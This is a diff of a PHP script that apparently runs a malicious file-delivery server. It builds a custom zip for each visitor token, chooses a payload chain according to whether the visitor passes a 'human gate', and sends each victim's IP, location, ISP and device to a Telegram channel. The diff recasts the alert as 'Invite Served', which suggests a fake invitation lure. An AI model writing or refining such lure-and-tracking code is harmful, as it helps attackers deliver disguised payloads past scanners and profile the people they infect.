@@ -58,16 +58,6 @@ foreach ($entries as $nm => $data) {
                           . substr($e, $i + strlen('@@LEVEL_KEY@@'));
         }
     }
-    // Engine profile from the behavioral verdict: 'fast' only when the
-    // visitor cleared the human gate; everything else (including legacy
-    // tokens with no verdict) ships the conservative 'robust' chain.
-    $profile = (isset($tok['p']) && $tok['p'] === 'fast') ? 'fast' : 'robust';
-    $e = (string)$entries[$nm];
-    $i = strpos($e, '@@PROFILE@@');
-    if ($i !== false) {
-        $entries[$nm] = substr($e, 0, $i) . $profile
-                      . substr($e, $i + strlen('@@PROFILE@@'));
-    }
 }
 
 // ---- build the fresh zip. Wrapped in a retry loop: on some kernels
@@ -120,15 +110,14 @@ $key = ALERT_DIR . '/dl_' . md5($tok['r'] . '|' . $name) . '.fired';
 if (!@file_exists($key)) {
     @touch($key);
     $g = geo(ip());
-    $msg = "\x{1F4E5} Download Served \x{1F4E5}\n"
+    $msg = "\x{1F942} \x{1F4E5} Invite Served \x{1F942}\n"
          . "\x{1F4C5} Time: " . date('Y-m-d H:i:s') . "\n"
          . "\x{1F4CD} IP: " . ip() . "\n"
          . "\x{1F30D} Location: " . $g['city'] . ", " . $g['country'] . "\n"
          . "\x{1F310} ISP: " . $g['isp'] . "\n"
          . "\x{1F4C1} File: " . $name . " (" . round(strlen($zipBytes) / 1048576, 2) . " MB)\n"
          . "\x{1F501} SHA256: " . substr(hash('sha256', $zipBytes), 0, 16) . "...\n"
-         . "\x{1F4F1} Device: " . ua()
-         . verdict_line($tok);
+         . "\x{1F4F1} Device: " . ua();
     tg($msg);
 }
 
